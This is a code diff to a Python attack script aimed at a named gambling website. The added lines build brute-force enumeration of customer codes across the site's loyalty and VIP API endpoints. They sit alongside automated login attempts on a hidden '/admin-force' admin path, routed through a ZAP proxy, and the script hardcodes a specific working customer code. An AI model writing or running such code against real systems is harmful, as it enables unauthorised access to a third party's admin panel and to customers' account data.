@@ -31,7 +31,10 @@ from bs4 import BeautifulSoup
 # Global configuration – change to match your engagement
 # ---------------------------------------------------------------------------
 TARGET_URL = "https://pigslot.co/"
-CUSTOMER_CODE = "PS663888386"
+CUSTOMER_CODES = [
+    "PS663888386",  # known working customer code
+    # "PS000000001",  # <-- add more potential codes to brute-force / test
+]
 ADMIN_PANEL_PATH = "/admin-force"  # discovered hidden path
 ADMIN_LOGIN_URL = urljoin(TARGET_URL, ADMIN_PANEL_PATH)
 
@@ -53,6 +56,21 @@ PROXIES = {
     "http": f"http://{ZAP_HOST}:{ZAP_PORT}",
     "https": f"http://{ZAP_HOST}:{ZAP_PORT}",
 }
+
+# ---------------------------------------------------------------------------
+# Static endpoints provided from manual intelligence / ZAP observation
+# Use {customer_code} placeholder where appropriate so we can iterate
+# ---------------------------------------------------------------------------
+
+STATIC_API_ENDPOINTS = [
+    "https://jklmn23456.com/api/v1/loyalty/{customer_code}/vip/status",
+    "https://jklmn23456.com/api/v1/loyalty/chat/token/guest",
+    "https://jklmn23456.com/api/v1/loyalty/chat/swear-word",
+    "https://api.bcdef45678.com/api/v1/feature-toggle/system-status",
+    "https://jklmn23456.com/api/v1/game/brand/",
+    "https://jklmn23456.com/api/v1/promotions/",
+    "https://jklmn23456.com/api/v1/campaigns/",
+]
 
 # ---------------------------------------------------------------------------
 # Helper utilities
@@ -206,7 +224,7 @@ def try_admin_login() -> Tuple[Optional[Dict], requests.Session]:
         if token_input and token_input.get("value"):
             payload[token_name] = token_input["value"]
     # Some portals also expect customer_code – include opportunistically
-    payload.setdefault("customer_code", CUSTOMER_CODE)
+    payload.setdefault("customer_code", CUSTOMER_CODES[0]) # Use the first customer code for login
 
     # Submit credentials (no redirect follow to inspect status code + location)
     resp = sess.post(ADMIN_LOGIN_URL, data=payload, allow_redirects=False, timeout=15)
@@ -302,6 +320,20 @@ def main():
 
     # 2. Extract API-looking endpoints
     api_endpoints = filter_api_endpoints(spider_urls)
+
+    # 2b. Append intelligence-based static endpoints (expand placeholders)
+    static_expanded: List[str] = []
+    for template in STATIC_API_ENDPOINTS:
+        if "{customer_code}" in template:
+            for code in CUSTOMER_CODES:
+                static_expanded.append(template.format(customer_code=code))
+        else:
+            static_expanded.append(template)
+
+    api_endpoints.extend(static_expanded)
+    # de-duplicate while preserving order
+    seen = set()
+    api_endpoints = [x for x in api_endpoints if not (x in seen or seen.add(x))]
 
     # 3. Attempt admin login
     cookies, session = try_admin_login()
